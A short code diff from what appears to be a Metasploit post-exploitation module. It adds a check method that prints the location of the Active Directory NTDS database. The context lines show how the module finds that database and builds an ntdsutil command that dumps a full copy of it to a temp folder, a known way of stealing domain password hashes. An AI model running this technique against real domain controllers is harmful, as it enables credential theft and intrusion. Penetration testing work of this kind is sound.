@@ -80,6 +80,11 @@ class Metasploit3 < Msf::Post
     @ntds_location ||= registry_getvaldata("HKLM\\SYSTEM\\CurrentControlSet\\services\\NTDS\\Parameters\\","DSA Working Directory")
   end
 
+  def check
+    loc = ntds_location
+    print_status "Original location #{loc.flatten}"
+  end
+
   def ntdsutil_method
     tmp_path = "#{get_env("%WINDIR%")}\\Temp\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
     command_arguments = "\"activate instance ntds\" \"ifm\" \"Create Full #{tmp_path}\" quit quit"
